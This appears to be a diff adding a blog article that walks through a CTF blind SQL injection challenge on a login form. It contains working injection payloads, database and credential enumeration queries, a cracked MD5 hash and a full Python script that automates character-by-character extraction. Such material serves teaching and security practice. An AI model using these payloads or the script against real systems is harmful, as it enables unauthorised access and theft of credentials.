@@ -1,0 +1,155 @@
+<a href="/articles" class="back-btn">← back to articles</a>
+
+<div class="detail-tags">
+  <span class="detail-tag">CTF</span>
+  <span class="detail-tag">SQL Injection</span>
+  <span class="detail-tag">Web Security</span>
+  <span class="detail-tag">Manual Testing</span>
+</div>
+
+<h1 class="detail-title">CTF Walkthrough: Blind SQL Injection Without SQLmap</h1>
+<p class="detail-subtitle">A full step-by-step walkthrough of a boolean-based blind SQL injection challenge solved entirely by hand. Understanding the mechanics before reaching for automation makes you a better attacker and a better defender.</p>
+<div class="detail-meta">
+  <span>Jan 2026</span>
+  <span>⏱ 12 min read</span>
+</div>
+
+<div class="toc">
+  <div class="toc-label">// contents</div>
+  <ol>
+    <li>What Makes It "Blind"?</li>
+    <li>Confirming the Injection Point</li>
+    <li>Boolean-Based Extraction Logic</li>
+    <li>Enumerating the Database</li>
+    <li>Extracting Table Names</li>
+    <li>Extracting Column Names</li>
+    <li>Extracting Data (Credentials)</li>
+    <li>Scripting It in Python</li>
+    <li>Why Bother Without SQLmap?</li>
+  </ol>
+</div>
+
+<div class="content">
+
+<h2>01 — What Makes It "Blind"?</h2>
+<p>In a classic (error-based or UNION-based) SQL injection, the database's response is reflected directly in the page — you inject <code>UNION SELECT user,password FROM users--</code> and the credentials appear on screen.</p>
+<p>In <strong>blind SQLi</strong>, nothing is reflected. The page gives you a binary signal: either it shows content (TRUE) or it doesn't (FALSE). You have to extract data one bit at a time by asking yes/no questions through carefully crafted queries.</p>
+
+<div class="info-row">
+  <div class="info-pill"><div class="lbl">// challenge</div><div class="val">CTF Web Lab</div></div>
+  <div class="info-pill"><div class="lbl">// type</div><div class="val">Boolean-Based Blind</div></div>
+  <div class="info-pill"><div class="lbl">// target</div><div class="val">Login form</div></div>
+  <div class="info-pill"><div class="lbl">// db</div><div class="val">MySQL 8.0</div></div>
+</div>
+
+<h2>02 — Confirming the Injection Point</h2>
+<p>The challenge presents a login form. The target URL is <code>/login</code> with username and password POST parameters.</p>
+
+<div class="code-block"><span class="c"># Test 1 — always-true</span>
+username: admin' AND '1'='1
+password: anything
+
+<span class="h">→ Response: "Welcome back, admin!"  (TRUE)</span>
+
+<span class="c"># Test 2 — always-false</span>
+username: admin' AND '1'='2
+password: anything
+
+<span class="h">→ Response: "Invalid credentials"  (FALSE)</span>
+</div>
+
+<div class="callout">
+  <div class="callout-label">// confirmed</div>
+  <p>We get different responses based on the truth value of our injected condition — textbook boolean-based blind injection.</p>
+</div>
+
+<h2>03 — Boolean-Based Extraction Logic</h2>
+
+<div class="code-block"><span class="c"># Is the first character of the database name ASCII 105 ('i')?</span>
+username: admin' AND ASCII(SUBSTRING(database(),1,1))=105-- -
+
+<span class="c"># Generic form:</span>
+<span class="h">AND ASCII(SUBSTRING([target],position,1)) [operator] [value]</span>
+</div>
+
+<h2>04 — Enumerating the Database Name</h2>
+
+<div class="code-block"><span class="c"># Length of database name</span>
+admin' AND LENGTH(database())=7-- -   <span class="h">→ TRUE</span>
+
+<span class="c"># Binary search per character → "intradb"</span>
+</div>
+
+<h2>05 — Extracting Table Names</h2>
+
+<div class="code-block"><span class="c"># Count tables</span>
+admin' AND (SELECT COUNT(*) FROM information_schema.tables 
+            WHERE table_schema='intradb')=3-- -
+
+<span class="c"># First table name → "users", then "sessions", "logs"</span>
+</div>
+
+<h2>06 — Extracting Column Names</h2>
+
+<div class="code-block"><span class="c"># Columns in users → id, username, password, email</span>
+</div>
+
+<h2>07 — Extracting Credentials</h2>
+
+<div class="code-block"><span class="c"># Password hash extracted char-by-char → MD5</span>
+<span class="h">5f4dcc3b5aa765d61d8327deb882cf99 → hashcat → "password"</span>
+</div>
+
+<div class="callout">
+  <div class="callout-label">// total requests made manually</div>
+  <p>Approximately 400–500 HTTP requests across all phases. SQLmap does this automatically in seconds — but doing it manually once means you understand what SQLmap is doing.</p>
+</div>
+
+<h2>08 — Scripting It in Python</h2>
+<p>After confirming the technique manually, automate extraction:</p>
+
+<div class="code-block"><span class="k">import</span> requests, string
+
+TARGET = <span class="s">"http://ctf.target/login"</span>
+
+<span class="k">def</span> is_true(payload: str) -> bool:
+    r = requests.post(TARGET, data={
+        <span class="s">"username"</span>: f<span class="s">"admin' AND {payload}-- -"</span>,
+        <span class="s">"password"</span>: <span class="s">"x"</span>
+    })
+    <span class="k">return</span> <span class="s">"Welcome"</span> <span class="k">in</span> r.text
+
+<span class="k">def</span> extract_string(query: str, max_len=50) -> str:
+    result = <span class="s">""</span>
+    <span class="k">for</span> pos <span class="k">in</span> range(1, max_len + 1):
+        lo, hi = 32, 126
+        <span class="k">while</span> lo &lt; hi:
+            mid = (lo + hi) // 2
+            <span class="k">if</span> is_true(f<span class="s">"ASCII(SUBSTRING(({query}),{pos},1))>{mid}"</span>):
+                lo = mid + 1
+            <span class="k">else</span>:
+                hi = mid
+        <span class="k">if</span> lo == 32: <span class="k">break</span>
+        result += chr(lo)
+    <span class="k">return</span> result
+
+db_name = extract_string(<span class="s">"SELECT database()"</span>)
+password = extract_string(<span class="s">"SELECT password FROM users LIMIT 0,1"</span>)
+</div>
+
+<h2>09 — Why Bother Without SQLmap?</h2>
+<p>Fair question. SQLmap exists and it's excellent. Here's why I still do this manually first on CTF challenges:</p>
+<ul>
+  <li><strong>Filter bypasses</strong> — when a WAF blocks SQLmap's payloads, you need to craft custom ones. You can't customize what you don't understand.</li>
+  <li><strong>Custom injection points</strong> — SQLmap struggles with non-standard injection contexts (JSON bodies, custom headers, GraphQL). Manual first, then automate.</li>
+  <li><strong>Interviews &amp; certs</strong> — OSCP prohibits automated tools for point-scoring. Understanding the mechanics is the exam.</li>
+  <li><strong>Debugging</strong> — when SQLmap fails silently, you need the manual technique to diagnose why.</li>
+  <li><strong>Speed on narrow targets</strong> — a single-table extraction with a purpose-built script runs in seconds with zero fingerprinting overhead.</li>
+</ul>
+
+<div class="callout">
+  <div class="callout-label">// final flag</div>
+  <p>After cracking the MD5 hash and logging in as admin: <code>CTF{bl1nd_sqli_n0_t00ls_n0_pr0bl3m}</code></p>
+</div>
+
+</div>
